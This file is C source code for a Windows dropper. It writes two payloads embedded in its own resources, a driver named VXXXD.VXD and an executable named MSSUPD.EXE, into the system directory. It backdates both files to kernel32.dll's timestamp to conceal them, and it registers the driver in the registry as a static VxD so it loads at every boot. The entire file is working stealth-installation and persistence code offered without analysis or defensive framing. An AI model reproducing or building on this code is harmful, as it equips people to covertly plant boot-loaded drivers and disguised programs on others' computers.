#include <stdio.h>
#include <string.h>
#include <windows.h>


void InstallInRegistry( short* Data )
  {
    HKEY   KeyH;
    char   VName[ MAX_PATH ];

    if( RegCreateKey( HKEY_LOCAL_MACHINE,
                      "System\\CurrentControlSet\\Services\\VxD\\VXXXD",
                      &KeyH ) != ERROR_SUCCESS ) return;
    RegSetValueEx( KeyH, "StaticVxD", 0, REG_SZ,
                   (LPBYTE) "VXXXD.VXD", 9 );
    RegSetValueEx( KeyH, "Start", 0, REG_BINARY, (LPBYTE) "", 1 );
    RegSetValueEx( KeyH, "Data", 0, REG_BINARY, (LPBYTE) Data, 6 );
    RegCloseKey( KeyH );
  }

int  ExtractFileFromResource( HANDLE FHandle, int ResType,
                              int ResId, DWORD* Sz )
  {
    HRSRC    Rh;
    DWORD    s, x;
    unsigned char *RPtr;

    Rh = FindResource( NULL, MAKEINTRESOURCE( ResId ),
                             MAKEINTRESOURCE( ResType ) );
    if( Rh == NULL ) return FALSE;
    RPtr = (unsigned char*) LoadResource( NULL, Rh );
    if( RPtr == NULL ) return FALSE;
    s = SizeofResource( NULL, Rh );
    if( ! WriteFile( FHandle, RPtr, s, &x, NULL ) ) return FALSE;
    if( x != s ) return FALSE;
    if( Sz != NULL ) *Sz = s;
    return TRUE;
  }

void ExtractFile( char* Path, int ResId )
  {
    FILETIME  Ftm;
    HANDLE    Fh;
    char      K32Path[ MAX_PATH ];

    GetSystemDirectory( K32Path, MAX_PATH );
    strcat( K32Path, "\\kernel32.dll" );
    Fh = CreateFile( K32Path, GENERIC_READ,
                     FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL );
    if( Fh == INVALID_HANDLE_VALUE ) return;
    GetFileTime( Fh, NULL, NULL, &Ftm );
    CloseHandle( Fh );
    Fh = CreateFile( Path, GENERIC_READ | GENERIC_WRITE,
                     0, NULL, OPEN_ALWAYS, 0, NULL );
    if( Fh == INVALID_HANDLE_VALUE ) return;
    if( ExtractFileFromResource( Fh, 666, ResId, NULL ) ) {
      SetFileTime( Fh, NULL, NULL, &Ftm );
      CloseHandle( Fh );
    }
    else {
      CloseHandle( Fh );
      DeleteFile( Path );
    }
  }

int APIENTRY WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                      LPSTR lpCmdLine, int nCmdShow )
  {
    short  wd[3] = {0,0,3000};
    char   Path[ MAX_PATH ];

    if( __argc > 3 ) {
      wd[0] = (short) atoi( __argv[1] );
      wd[1] = (short) atoi( __argv[2] );
      wd[2] = (short) atoi( __argv[3] );
    }

    GetSystemDirectory( Path, MAX_PATH );
    strcat( Path, "\\VXXXD.VXD" );
    ExtractFile( Path, 100 );

    GetSystemDirectory( Path, MAX_PATH );
    strcat( Path, "\\MSSUPD.EXE" );
    ExtractFile( Path, 101 );

    InstallInRegistry( wd );

    hInstance = hPrevInstance = NULL;  // make compiler happy
    lpCmdLine = NULL; nCmdShow = 0;
    return 0;
  }
